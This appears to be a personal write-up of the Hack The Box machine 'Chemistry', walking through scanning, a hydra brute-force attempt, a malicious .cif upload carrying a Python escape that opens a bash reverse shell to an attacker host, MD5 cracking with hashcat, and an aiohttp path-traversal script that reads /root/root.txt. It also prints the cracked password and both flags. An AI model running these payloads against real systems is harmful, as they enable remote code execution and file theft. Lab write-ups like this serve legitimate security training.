
[[HTB]] : [[Machines]]

**Date:** 08/01/25  
**Target IP:** 10.10.11.38

---

### **Initial Scanning**

**[[Nmap]] Results:**

- **22/tcp**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
- **5000/tcp**: Werkzeug httpd 3.0.3 (Python 3.9.5)

**Nikto Scan:**

- Detected outdated Python version: **3.9.5** (latest is at least 3.9.6).

---

### **Exploration and Enumeration**

**Port 5000 (HTTP):**

- Navigated to the website hosted on port 5000.
- Found **Login** and **Register** pages.
- Discovered a vulnerability on the **Register page**:
    - "User exists" prompt enables **username enumeration**.
    - Confirmed the existence of the `admin` user.

---

### **Exploitation**

1. **Brute Forcing Login:**
    
    - Attempted brute forcing with [[hydra]] :
        
        ```
        hydra -l admin -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt 10.10.11.38 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -I -vV
        ```
        
    - Brute forcing was unsuccessful.
2. **File Upload Vulnerability:**
    
    - Registered a new user and accessed a file upload functionality for `.cif` files.
    - Exploited a known vulnerability in `.cif` file handling in Python:
        - Reference: [GHSA-vgv8-5cpj-qj2f](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f)
    - Uploaded a malicious `.cif` file to execute a **bash reverse shell**.
    
    **Malicious .cif File Content:**
    
    ```plaintext
	data_5yOhtAoR
	_audit_creation_date            2018-06-08
	_audit_creation_method          
	
	loop_
	_parent_propagation_vector.id
	_parent_propagation_vector.kxkykz
	k1 [0 0 0]
	
	_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<attacker ip>/1234 0>&1\'");0,0,0'
	
	
	_space_group_magn.number_BNS  62.448
	_space_group_magn.name_BNS
    ```
    
    - Launched a **Netcat listener** (`nc -nvlp 1234`) to capture the reverse shell.

---

### **Post-Exploitation**

1. **Access Gained:**
    
    - Obtained access to the `app` user via the reverse shell.
2. **App Enumeration:**
    
    - Found sensitive information in `app.py`:
        - Flask secret key: `MyS3cretCh3mistry4PP`
        - SQLite DB URL: `sqlite:///database.db`
    - Transferred the database file to the local machine using a Python HTTP server.
3. **Database Analysis:**
    
    - Analyzed the SQLite database using an online viewer ([SQLite Viewer](https://inloop.github.io/sqlite-viewer/)).
    - Found a table with MD5-hashed passwords:
        - `63ed86ee9f624c7b14f1d4f43dc251a5` (hash for the `rosa` user).
4. **Password Cracking:**
    
    - Cracked the hash using `hashcat`:
        
        ```
        hashcat -m 0 -a 0 rosa_hash /usr/share/wordlists/rockyou.txt
        ```
        
        - **Cracked Password:** `unicorniosrosados`
5. **SSH Access to `rosa`:**
    
    - Logged in via SSH:
        
        ```
        ssh rosa@10.10.11.38
        ```
        
    - Retrieved the user flag:
        
        ```
        rosa@chemistry:~$ cat user.txt
        e5778c455c79cd3b24a14dc42cd897b7
        ```
        

---

### **Privilege Escalation**

1. **Port Forwarding:**
    
    - Discovered a service running on **localhost:8080**.
    - Forwarded the port:
        
        ```
        ssh -L 4321:localhost:8080 rosa@10.10.11.38
        ```
        
    - Accessed an analytics page with a server banner indicating:
        - `aiohttp/3.9.1`
2. **File Disclosure Exploit:**
    
    - Identified a vulnerability in `aiohttp/3.9.1`.
        - Reference: [CVE-2024-23334-PoC](https://github.com/z3rObyte/CVE-2024-23334-PoC)
    - Modified the exploit to fetch `/root/root.txt`.
    
    **Exploit Script:**
    
    ```bash
    url="http://localhost:8080"
    payload="/assets/"
    file="root/root.txt"
    
    for ((i=0; i<15; i++)); do
        payload+="../"
        status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
        if [[ $status_code -eq 200 ]]; then
            curl -s --path-as-is "$url$payload$file"
            break
        fi
    done
    ```
    
3. **Root Flag Obtained:**
    
    - Successfully retrieved the root flag:
        
        ```
        25eeadc405adda911ccb96789fc5b82f
        ```
        

---

### **Summary**

- **User Flag:** `e5778c455c79cd3b24a14dc42cd897b7`
- **Root Flag:** `25eeadc405adda911ccb96789fc5b82f`
- **Key Vulnerabilities Identified:**
    - Username enumeration on the Register page.
    - File upload vulnerability allowing remote code execution.
    - Outdated `aiohttp` version with file disclosure vulnerability.
